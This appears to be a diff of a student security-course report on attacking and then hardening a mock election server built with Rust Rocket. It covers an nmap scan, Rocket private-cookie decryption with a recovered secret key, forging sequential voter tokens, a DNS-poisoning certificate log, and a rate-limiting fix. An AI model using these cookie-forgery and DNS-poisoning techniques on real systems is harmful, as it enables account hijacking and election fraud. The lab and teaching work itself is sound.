@@ -651,7 +651,7 @@ Retrying the request a few times returns the same 64 character hex string. This 
 
 ### Cookie Capture and Decryption
 
-The first step of surveiling the webserver was to perform a scan of the host to find any valueable information. To do this, we executed `nmap -v -A api.internal` whose output can be found in appendix B figure 1. Abridged output only including pertainant information follows:
+The first step of surveiling the webserver was to perform a scan of the host to find any valuable information. To do this, we executed `nmap -v -A api.internal` whose output can be found in appendix B figure 1. Abridged output only including pertinent information follows:
 ```zsh
 Nmap scan report for api.internal (10.64.10.1)
 Not shown: 998 closed tcp ports (conn-refused)
@@ -671,7 +671,7 @@ PORT    STATE SERVICE   VERSION
 ```
 The server only has two ports open: SSH and HTTPS, and nmap cannot identify the http server. However, this still contains very useful information. One of `nmap`'s requests returned 404 and part of the 404 response was the word rocket. A simple web search of "rocket web server" returns information about the the Rust Rocket API. Now we know with what the webserver was built. 
 
-The next step was to log in to the server using valid credentials and analize its communications. The server gives the user a cookie after successfully logging in, for example we recieved
+The next step was to log in to the server using valid credentials and analyze its communications. The server gives the user a cookie after successfully logging in, for example we received:
 ```
 votertoken:"DA%2FZytKeNZ+deMcdVhUo5TZM1j8YMI7arqOvwnc%3D"
 ```
@@ -683,7 +683,7 @@ Knowing that the server was built with the Rocket API and that it seems to be se
 Can't be manufactured by clients, eh? We'll see about that. Further in the same section, the guide states 
 >To encrypt private cookies, Rocket uses the 256-bit key specified in the secret_key configuration parameter. [...] The value of the parameter may either be a 256-bit base64 or hex string or a 32-byte slice.
 
-This description exactly matches the key recovered from the keyserver in the previous step. Looking through the rocket source code, it impliments the library cookie-rs (https://github.com/SergioBenitez/cookie-rs) for cookie handling, which in turn has a private-cookie functionality which impliments AES-GCM. Using Cookie-rs's cryptography code as a base and the known secret key, we were able to successfully decrypt and re-ecrypt the cookie from the api server. A portion of the decryption source code follows:
+This description exactly matches the key recovered from the keyserver in the previous step. Looking through the rocket source code, it implements the library cookie-rs (https://github.com/SergioBenitez/cookie-rs) for cookie handling, which in turn has a private-cookie functionality which implements AES-GCM. Using Cookie-rs's cryptography code as a base and the known secret key, we were able to successfully decrypt and re-encrypt the cookie from the api server. A portion of the decryption source code follows:
 ```rust
 // Credit: cookie-rs by Sergio Benitez
     let data = base64::decode(cstring).map_err(|_| "bad base64 value")?;
@@ -701,12 +701,12 @@ This description exactly matches the key recovered from the keyserver in the pre
 ```
 *source: https://github.com/SergioBenitez/cookie-rs/blob/master/src/secure/private.rs*
 
-The decrypted value from this operation is the string representaiton of an integer, in this case `"10"`, presumably a value that is incrimented for each user as they log on. By incrimenting this value ourselves and generating and encrypting a new cookie with this new value, we will have the authorization token of the next person who logs in to vote.
+The decrypted value from this operation is the string representation of an integer, in this case `"10"`, presumably a value that is incremented for each user as they log on. By incrementing this value ourselves and generating and encrypting a new cookie with this new value, we will have the authorization token of the next person who logs in to vote.
 
 ### Cookie Monster
-To exploit this, we wrote the rust program Cookie Monster, which carries out this section of the attack automatically. It first logs in to the web server with valid credentials to fetch a cookie, then it vote as normal using this cookie. Cookie Monster then decrypts the contents of the cookie using a secret key passed via the command line, extracts its sequence number, incriments it, and creates a new cookie with this new sequence number. This cookie is signed, encrypted, and used to register another vote. 
+To exploit this, we wrote the rust program Cookie Monster, which carries out this section of the attack automatically. It first logs in to the web server with valid credentials to fetch a cookie, then it vote as normal using this cookie. Cookie Monster then decrypts the contents of the cookie using a secret key passed via the command line, extracts its sequence number, increments it, and creates a new cookie with this new sequence number. This cookie is signed, encrypted, and used to register another vote. 
 
-Registering another vote may not immediatley work as the forged cookie needs a valid user to log in to make its sequence number valid. Cookie Monster will keep re-trying voting with a cookie until the vote is accepted, then it makes a new incrimented cookie and repeates the process. By doing this, we are depriving all voters who attempt to cast ballots after Cookie Monster is started of their vote and using their credentials to cast our own ballots. This process will repeat until a keyboard interrupt is given. A snippet of this code follows: 
+Registering another vote may not immediately work as the forged cookie needs a valid user to log in to make its sequence number valid. Cookie Monster will keep re-trying voting with a cookie until the vote is accepted, then it makes a new incremented cookie and repeated the process. By doing this, we are depriving all voters who attempt to cast ballots after Cookie Monster is started of their vote and using their credentials to cast our own ballots. This process will repeat until a keyboard interrupt is given. A snippet of this code follows: 
 ```rust
 loop{
   // send a new vote with our forged cookie
@@ -890,9 +890,18 @@ state.rktsnd.send((1, rndm)).unwrap();
 ### Mitigating V-WEB-02: Web Server vulnerable to repeated requests with invalid cookies
 While a random value for the authenticaiton cookie payload is more secure than a sequential one, it does not prevent a adversary with the signing master key from flooding the webserver with arbitrary cookies until one of them is valid. 
 
-To mitigate this, we impliment IP based rate-limiting on the webserver.
+To mitigate this, we impliment IP based rate-limiting on the webserver. The server records every time than an IP successfully authenticates and every time an IP attempts to POST a vote ballot. If an address attempts to vote 10 more times than it logged in, it is banned for two hours. During this ban period, all vote POSTs, regardless of cookie validity, are redirected back to the login page. This approach has obvious downsides: the first being that IP logging is a privacy and conficenciality risk. However, this is an acceptable risk as the IP addresses are not correlated to any identifying information including SSN, cookie ID, or ballot cast, additionally the server does not keep a log of when the addresses performed certain actions, simply when their ban ends. The second issue is that this mitigation adds a significant processing and memory overhead to the server, however we have the resources to spare since rust is such an efficient language. The security benefits outweigh the costs. The only data about the IP that the server records is the content of the following struct: 
+```rust
+struct Address {
+    addr: IpAddr,
+    counter: i32,
+    banbool: bool,
+    banstart: time::SystemTime,
+}
+```
+Additionally, this data is only kept in RAM and gets dropped when the server shuts down. 
 
-## Appendix
+# Appendix
 
 All our source code is available under the [cs4404-mission1](https://github.com/cs4404-mission1) GitHub organization. The repositories are organized as follows:
 
@@ -907,3 +916,282 @@ All our source code is available under the [cs4404-mission1](https://github.com/
 **keyserver** - Server and exploit for key server
 
 **ca** - Server and exploit for certificate authority
+
+## Appendix A
+```rust
+#[post("/login", data = "<user>")]
+async fn userlogon(db: Connection<Vote>, state: &State<Persist>, cookies: &CookieJar<'_>, user: Form<User<'_>>) -> Redirect{
+    let authok: bool;
+    match hash_password(user.password.to_string()){ // argon 2 salt and hash
+        Ok(hash) => {
+            // retrieve the user record from sqlite
+            match get_password(db, user.ssn).await{ 
+                // authok is true if the known hash and entered password's hash match
+                Some(tmp) => authok = hash == tmp, 
+                None => authok = false,
+            }
+            },
+        // If the user input fails automatic sanitization, send them back to login
+        Err(_) => return Redirect::to(uri!(index())), 
+    }
+    if authok{
+        println!("authentication OK");
+        // get next auth number in sequence
+        let rndm: String = (state.votekey.fetch_add(1, Ordering::Relaxed) + 1).to_string(); 
+        // give client encrypted cookie with sequence number as payload
+        cookies.add_private(Cookie::new("votertoken", rndm.clone())); 
+        // tell authtoken thread to add new number to list of authorized keys
+        state.rktsnd.send((1, rndm)).unwrap(); 
+        // redirect authorized user to voting form
+        return Redirect::to(uri!(vote()));
+    }
+    // redirect unauthorized user back to login
+    Redirect::to(uri!(index()))
+}
+```
+*Figure 1: part of the user authorization mechanism for the Vote API*
+
+ ```rust
+ #[post("/vote", data = "<vote>")]
+async fn recordvote(mut db: Connection<Vote>, state: &State<Persist>, cookies: &CookieJar<'_>, vote: Form<Ballot<'_>>) -> Redirect{
+    let mut status = 1;
+    let key: String;
+    // retrieve cookie from user
+    match cookies.get_private("votertoken"){
+        Some(crumb) => {
+            // get auth sequence number from cookie
+            key = crumb.value().to_string();
+            // send verification request to authtoken thread
+            state.rktsnd.send((0, key.clone())).unwrap();
+            // wait for authtoken responce
+            loop{
+                let out = state.rktrcv.recv_timeout(Duration::from_millis(10)).unwrap();
+                if out.1 == key{
+                    status = out.0;
+                    break;
+                }
+            }
+            //remove cookie from user
+            cookies.remove_private(crumb);
+        }
+        //if the user doesn't have a cookie, send them to login
+        None => return Redirect::to(uri!(index())),
+    }
+    if status == 0{
+        // run sql command to incriment vote tally for selected candidate (form input is santitized automatically)
+        sqlx::query("UPDATE Votes SET count = (SELECT count FROM Votes WHERE name = ?)+1 WHERE name = ?;")
+        .bind(vote.candidate).bind(vote.candidate).execute(&mut *db).await.unwrap();
+        // tell authtoken thread to invalidate user's sequence number so a replay cannot be done
+        state.rktsnd.send((2, key)).unwrap();
+        // tell user everything worked
+        Redirect::to(uri!(done()))
+    }
+    else{ 
+    // assume something's gone wrong and direct user back to logon page
+    Redirect::to(uri!(index()))
+    }
+    
+}
+ ```
+*Figure 2: The main vote recording function of the Vote API, including token-based authorization*
+## Appendix B
+```zsh
+Nmap scan report for api.internal (10.64.10.1)
+Host is up (0.00027s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT    STATE SERVICE   VERSION
+22/tcp  open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6340e54447875d36bdafeb67da7308c0 (RSA)
+|   256 cc59f446f20997e2abdbe9c1052dcd7b (ECDSA)
+|_  256 0db91dd0662428851aa2dee63f47a8bf (ED25519)
+443/tcp open  ssl/https PWNED
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| ssl-cert: Subject: organizationName=DigiShue CA
+| Subject Alternative Name: DNS:api.internal
+| Issuer: organizationName=DigiShue CA
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T19:15:58
+| Not valid after:  2032-11-08T19:15:58
+| MD5:   8883885c9b57caa3248f0c15071e9eaa
+|_SHA-1: 6d39e6bfea44b5201162ac5f4f1cb4696a722024
+|_http-server-header: PWNED
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     content-type: text/html; charset=utf-8
+|     server: PWNED
+|     permissions-policy: interest-cohort=()
+|     x-content-type-options: nosniff
+|     x-frame-options: SAMEORIGIN
+|     strict-transport-security: max-age=31536000
+|     content-length: 564
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <body>
+|     <h1>Schueworld Public Web Network Election Database (PWNED)</h1>
+|     <div>Please enter your credentials below to proceed.</div><br>
+|     <form action="/login", method="post">
+|     <label for="ssn">Social Security Number:</label><br>
+|     <input type="text" id="ssn" name="ssn"><br>
+|     <label for="password">Secret Passphrase from Mail:</label><br>
+|     <input type="text" id="password" name="password">
+|     <br>
+|     <br><input type="submit" value="Submit">
+|     </form>
+|     <p>Please remember to enable cookies on this site!</p>
+|     </body>
+|     </html>
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     content-type: text/html; charset=utf-8
+|     server: PWNED
+|     permissions-policy: interest-cohort=()
+|     x-content-type-options: nosniff
+|     x-frame-options: SAMEORIGIN
+|     strict-transport-security: max-age=31536000
+|     content-length: 383
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>404 Not Found</title>
+|     </head>
+|     <body align="center">
+|     <div role="main" align="center">
+|     <h1>404: Not Found</h1>
+|     <p>The requested resource could not be found.</p>
+|     </div>
+|     <div role="contentinfo" align="center">
+|     <small>Rocket</small>
+|     </div>
+|     </body>
+|_    </html>
+|_ssl-date: TLS randomness does not represent time
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port443-TCP:V=7.93%T=SSL%I=7%D=11/9%Time=636C63D3%P=x86_64-redhat-linux
+SF:-gnu%r(GetRequest,34B,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/
+SF:html;\x20charset=utf-8\r\nserver:\x20PWNED\r\npermissions-policy:\x20in
+SF:terest-cohort=\(\)\r\nx-content-type-options:\x20nosniff\r\nx-frame-opt
+SF:ions:\x20SAMEORIGIN\r\nstrict-transport-security:\x20max-age=31536000\r
+SF:\ncontent-length:\x20564\r\ndate:\x20Thu,\x2010\x20Nov\x202022\x2002:37
+SF::06\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\n<body>\n
+SF:\x20\x20<h1>Schueworld\x20Public\x20Web\x20Network\x20Election\x20Datab
+SF:ase\x20\(PWNED\)</h1>\n\n\n\x20\x20<div>Please\x20enter\x20your\x20cred
+SF:entials\x20below\x20to\x20proceed\.</div><br>\n\x20\x20<form\x20action=
+SF:\"/login\",\x20method=\"post\">\n\x20\x20<label\x20for=\"ssn\">Social\x
+SF:20Security\x20Number:</label><br>\n\x20\x20<input\x20type=\"text\"\x20i
+SF:d=\"ssn\"\x20name=\"ssn\"><br>\n\n\x20\x20<label\x20for=\"password\">Se
+SF:cret\x20Passphrase\x20from\x20Mail:</label><br>\n\x20\x20<input\x20type
+SF:=\"text\"\x20id=\"password\"\x20name=\"password\">\n\x20\x20<br>\n\x20\
+SF:x20<br><input\x20type=\"submit\"\x20value=\"Submit\">\n</form>\n<p>Plea
+SF:se\x20remember\x20to\x20enable\x20cookies\x20on\x20this\x20site!</p>\n<
+SF:/body>\n</html>\n\n")%r(HTTPOptions,29D,"HTTP/1\.0\x20404\x20Not\x20Fou
+SF:nd\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\nserver:\x20PWNED\
+SF:r\npermissions-policy:\x20interest-cohort=\(\)\r\nx-content-type-option
+SF:s:\x20nosniff\r\nx-frame-options:\x20SAMEORIGIN\r\nstrict-transport-sec
+SF:urity:\x20max-age=31536000\r\ncontent-length:\x20383\r\ndate:\x20Thu,\x
+SF:2010\x20Nov\x202022\x2002:37:06\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html
+SF:\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n
+SF:\x20\x20\x20\x20<title>404\x20Not\x20Found</title>\n</head>\n<body\x20a
+SF:lign=\"center\">\n\x20\x20\x20\x20<div\x20role=\"main\"\x20align=\"cent
+SF:er\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>404:\x20Not\x20Found</h1>\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20<p>The\x20requested\x20resource\x20could
+SF:\x20not\x20be\x20found\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<hr\x20/>
+SF:\n\x20\x20\x20\x20</div>\n\x20\x20\x20\x20<div\x20role=\"contentinfo\"\
+SF:x20align=\"center\">\n\x20\x20\x20\x20\x20\x20\x20\x20<small>Rocket</sm
+SF:all>\n\x20\x20\x20\x20</div>\n</body>\n</html>");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
+```
+*Figure 1: nmap output of scan against api.internal*
+
+```
+{
+	"Connection:": {
+		"Protocol version:": "TLSv1.3",
+		"Cipher suite:": "TLS_AES_128_GCM_SHA256",
+		"Key Exchange Group:": "x25519",
+		"Signature Scheme:": "RSA-PSS-SHA512"
+	},
+	"Host api.internal:": {
+		"HTTP Strict Transport Security:": "Enabled",
+		"Public Key Pinning:": "Disabled"
+	},
+	"Certificate:": {
+		"Issued To": {
+			"Common Name (CN):": "<Not Available>",
+			"Organization (O):": "DigiShue CA",
+			"Organizational Unit (OU):": "<Not Available>"
+		},
+		"Issued By": {
+			"Common Name (CN):": "<Not Available>",
+			"Organization (O):": "DigiShue CA",
+			"Organizational Unit (OU):": "<Not Available>"
+		},
+		"Period of Validity": {
+			"Begins On:": "Tue, 08 Nov 2022 19:15:58 GMT",
+			"Expires On:": "Mon, 08 Nov 2032 19:15:58 GMT"
+		},
+		"Fingerprints": {
+			"SHA-256 Fingerprint:": "F1:16:12:97:56:28:D6:E2:2D:ED:93:93:2D:8F:2A:14:02:E7:7E:A5:CA:F1:BB:87:40:2F:A1:1A:71:66:7F:7C",
+			"SHA1 Fingerprint:": "6D:39:E6:BF:EA:44:B5:20:11:62:AC:5F:4F:1C:B4:69:6A:72:20:24"
+		},
+		"Transparency:": "<Not Available>"
+	}
+}
+```
+*Figure 2: HTTP security information - output by firefox developer tools*
+
+```
+================================================================================
+-----------------------------Welcome to Auto Elect!-----------------------------
+Is democracy too inconvenient? We've got you covered.
+================================================================================
+
+
+
+--------------------Registering interface on secure vlan...---------------------
+Registered.
+
+------------------------------Launching MTLSploit-------------------------------
+2022/11/09 02:51:46 Preparing DNS poisoner
+2022/11/09 02:51:46 Creating pwn0 interface with 10.64.10.2
+2022/11/09 02:51:46 Fetching validation token
+2022/11/09 02:51:46 Serializing DNS packet
+2022/11/09 02:51:46 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
+2022/11/09 02:51:46 Sending DNS responses to 10.64.10.3:50000
+2022/11/09 02:51:46 Waiting for DNS cache poisoning
+2022/11/09 02:51:47 Validating token with CA
+2022/11/09 02:52:06 Wrote api.internal-crt.pem and api.internal-key.pem
+2022/11/09 02:52:06 Stopped DNS poisoner
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:999: InsecureRequestWarning: Unverified HTTPS request is being made to host 'keyserver.internal'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+I found the API's secret key! It's  E+OOHJEe8ErDLtTjQx1DVJKX8E0NWmRmTBPWzr/1Mso=
+
+
+
+----------------------------Launching Cookie Monster----------------------------
+Got cookie votertoken,FT4OHKF++tHdIlHY1RTNjTMp5hRhPp1qe7sgDR0%3D
+
+Decrypted value: Name=votertoken, value=1
+Entering endless loop, press ctrl+C to exit.
+Voted for gus with sequence number 2
+Voted for gus with sequence number 3
+Voted for gus with sequence number 4
+Voted for gus with sequence number 5
+Voted for gus with sequence number 6
+Voted for gus with sequence number 7
+Voted for gus with sequence number 8
+Voted for gus with sequence number 9
+^C
+
+Thank you for choosing us to subvert your election <3
+student@client:~/hack$
+```
+*Figure 3: Output of the autovote python script*
